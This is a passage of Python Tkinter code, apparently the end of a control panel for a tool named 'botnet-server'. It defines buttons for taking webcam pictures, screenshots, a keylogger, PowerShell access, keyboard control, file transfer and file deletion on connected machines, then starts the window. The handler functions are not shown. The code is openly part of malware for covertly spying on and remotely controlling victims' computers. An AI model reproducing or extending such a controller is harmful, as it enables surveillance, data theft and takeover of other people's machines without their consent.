	btn_takepicture = Button(right_buttons,state=button_state,text='take picture',command=lambda:Thread(target=take_picture).start(),**kwargs)


	#dashboard buttons
	btn_theme  = Button(controlls_frame,text='themes',command=changetheme,**kwargs)
	btn_clear  = Button(controlls_frame,text='clear',command=lambda:clear(display),**kwargs)
	btn_start  = Button(controlls_frame,text=btn_start_text,command=start_server,**kwargs)

	
	home_buttons=[btn_send_file,btn_recv_file,btn_screenshot,btn_takepicture,btn_mkdir,btn_rmdir,btn_open,btn_extract_zip,
	btn_keyboard_controll,btn_rmf,btn_linux,btn_archive,btn_keylogger,btn_powershell,btn_popup,btn_home]
	

	for button in home_buttons:
		button.pack(fill=BOTH,expand=True,padx=btn_pad_x,pady=btn_pad_y)


	btn_clear.pack(side=LEFT,fill=BOTH,expand=True,padx=30,pady=10)
	btn_start.pack(side=LEFT,fill=BOTH,expand=True,padx=30,pady=10)
	btn_theme.pack(side=LEFT,fill=BOTH,expand=True,padx=30,pady=10)



	


root = Tk()
root.title('botnet-server')
root.geometry(f'{width}x{height}')
default_theme()
root.mainloop()